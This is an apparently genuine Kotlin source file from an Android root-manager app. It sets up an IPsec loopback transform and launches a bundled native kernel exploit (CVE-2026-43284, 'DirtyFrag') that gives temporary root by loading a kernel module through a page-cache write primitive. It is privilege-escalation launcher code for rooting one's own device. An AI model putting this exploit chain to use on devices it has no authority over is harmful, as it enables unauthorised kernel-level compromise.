package com.sukisu.ultra.ui.util

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import android.util.Log
import com.sukisu.ultra.BuildConfig
import com.sukisu.ultra.ksuApp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.net.DatagramSocket
import java.net.InetAddress
import java.nio.file.Files
import java.nio.file.StandardCopyOption
import java.security.SecureRandom

/**
 * DirtyFrag Root (CVE-2026-43284): a temporary, non-persistent root that needs no
 * unlocked bootloader. Kernel side is dfroot.ko, which is loaded through the
 * page-cache write primitive and then runs our staged ksud in late-load mode.
 *
 * Ported from diabl0w/DFRoot. Unlike upstream, the SU manager is not selectable:
 * our own package always owns the root session.
 */
object DirtyFragRunner {

    private const val TAG = "DirtyFrag"

    /** Read by the in-kernel bootstrap (native bootstrap.c), keep the names in sync. */
    const val PREFS_NAME = "dfroot"
    const val PREF_SU_MANAGER = "su_manager"
    const val PREF_SOFT_REBOOT = "soft_reboot"
    const val PREF_DISABLE_MODULES = "disable_modules"

    private const val EXPLOIT_BIN = "libdfroot.so"
    private const val KSUD_LIB = "libksud.so"
    private const val BOOTSTRAP_LIB = "libbootstrap.so"

    private const val RC_OK = 0
    private const val RC_KSUD_FAILED = 1
    private const val RC_FAILED = 2

    fun isArchSupported(): Boolean = Build.SUPPORTED_ABIS.any { it == "arm64-v8a" }

    fun isAvailable(): Boolean =
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && isArchSupported()

    /** The hook is one-shot: /dev/df is created by the payload and cleared on reboot. */
    fun isHooked(): Boolean = File("/dev/df").exists()

    fun setSoftReboot(enabled: Boolean) {
        prefs().edit().putBoolean(PREF_SOFT_REBOOT, enabled).apply()
    }

    fun setDisableModules(enabled: Boolean) {
        prefs().edit().putBoolean(PREF_DISABLE_MODULES, enabled).apply()
    }

    fun softReboot(): Boolean = prefs().getBoolean(PREF_SOFT_REBOOT, false)

    fun disableModules(): Boolean = prefs().getBoolean(PREF_DISABLE_MODULES, false)

    private fun prefs() =
        ksuApp.createDeviceProtectedStorageContext()
            .getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    suspend fun run(onLog: (String) -> Unit): Int = withContext(Dispatchers.IO) {
        if (!isAvailable()) {
            onLog("unsupported: needs Android 9+ on arm64\n")
            return@withContext RC_FAILED
        }
        if (isHooked()) {
            onLog("already hooked, skipping\n")
            return@withContext RC_OK
        }

        reportDeviceInfo(onLog)

        val deCtx = ksuApp.createDeviceProtectedStorageContext()
        // bootstrap reads the manager package back from these prefs
        prefs().edit().putString(PREF_SU_MANAGER, ksuApp.packageName).apply()

        try {
            stage(deCtx, File(ksuApp.applicationInfo.nativeLibraryDir, KSUD_LIB), "ksud")
            stage(deCtx, File(ksuApp.applicationInfo.nativeLibraryDir, BOOTSTRAP_LIB), "bootstrap")
        } catch (e: Exception) {
            Log.e(TAG, "staging failed", e)
            onLog("staging failed: ${e.message}\n")
            return@withContext RC_FAILED
        }

        val ipsec = ksuApp.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
        if (ipsec == null) {
            onLog("IpSecManager unavailable\n")
            return@withContext RC_FAILED
        }

        val encapSock = ipsec.openUdpEncapsulationSocket()
        val loopback = InetAddress.getByName("127.0.0.1")
        val spiObj = ipsec.allocateSecurityParameterIndex(loopback)
        val aesKey = ByteArray(32).also { SecureRandom().nextBytes(it) }
        val senderPort = DatagramSocket().use { it.localPort }

        val transform = IpSecTransform.Builder(ksuApp)
            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
            .setIpv4Encapsulation(encapSock, senderPort)
            .buildTransportModeTransform(loopback, spiObj)

        try {
            execExploit(encapSock.port, spiObj.spi, aesKey, senderPort, onLog)
        } finally {
            runCatching { transform.close() }
            runCatching { spiObj.close() }
            runCatching { encapSock.close() }
        }
    }

    private fun reportDeviceInfo(onLog: (String) -> Unit) {
        onLog("* manager: ${BuildConfig.VERSION_NAME} (${ksuApp.packageName})\n")
        onLog("* manufacturer: ${Build.MANUFACTURER}\n")
        onLog("* model: ${Build.MODEL}\n")
        onLog("* android: ${Build.VERSION.RELEASE}\n")
        onLog("* security patch: ${Build.VERSION.SECURITY_PATCH}\n")
        onLog("* kernel: ${System.getProperty("os.version", "unknown")}\n\n")
    }

    private fun stage(ctx: Context, src: File, name: String) {
        if (!src.exists()) throw IllegalStateException("${src.name} not found")
        val dest = File(ctx.filesDir.parentFile, name)
        Files.copy(src.toPath(), dest.toPath(), StandardCopyOption.REPLACE_EXISTING)
        if (!dest.setExecutable(true, false)) {
            throw IllegalStateException("setExecutable failed: ${dest.absolutePath}")
        }
    }

    private fun execExploit(
        encapPort: Int,
        spi: Int,
        aesKey: ByteArray,
        senderPort: Int,
        onLog: (String) -> Unit,
    ): Int {
        val bin = File(ksuApp.applicationInfo.nativeLibraryDir, EXPLOIT_BIN)
        val cmd = listOf(
            bin.absolutePath,
            "--encap-port", encapPort.toString(),
            "--sender-port", senderPort.toString(),
            "--spi", Integer.toUnsignedString(spi),
            "--aes-key", aesKey.joinToString("") { "%02x".format(it) },
        )

        val process = ProcessBuilder(cmd).redirectErrorStream(true).start()
        BufferedReader(InputStreamReader(process.inputStream)).use { reader ->
            while (true) {
                val line = reader.readLine() ?: break
                Log.i(TAG, line)
                onLog("$line\n")
            }
        }
        val rc = process.waitFor()
        return when {
            rc == RC_OK -> RC_OK
            rc == RC_KSUD_FAILED -> RC_KSUD_FAILED
            else -> RC_FAILED
        }
    }
}
